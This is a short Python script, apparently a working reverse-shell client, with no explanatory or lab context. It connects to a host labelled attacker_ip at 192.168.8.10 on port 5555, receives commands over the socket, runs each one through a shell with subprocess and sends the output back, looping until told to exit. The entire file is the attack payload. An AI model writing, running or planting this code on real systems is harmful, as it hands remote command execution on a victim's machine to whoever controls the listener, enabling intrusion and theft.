import socket
import subprocess

def connect():
    attacker_ip = "192.168.8.10"
    attacker_port = 5555
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))
        while True:
            data = s.recv(1024)
            if not data:
                break
            command = data.decode("utf-8", errors="ignore").replace('\x00', '').strip()
            if command.lower() == "exit":
                break
            result = subprocess.run(command, shell=True, capture_output=True, text=False)
            stdout = result.stdout or b""
            stderr = result.stderr or b""
            s.send(stdout + stderr)
    except Exception as e:
        try:
            s.send(f"[!] Error: {str(e)}".encode("utf-8"))
        except:
            pass
    finally:
        s.close()

if __name__ == "__main__":
    connect()
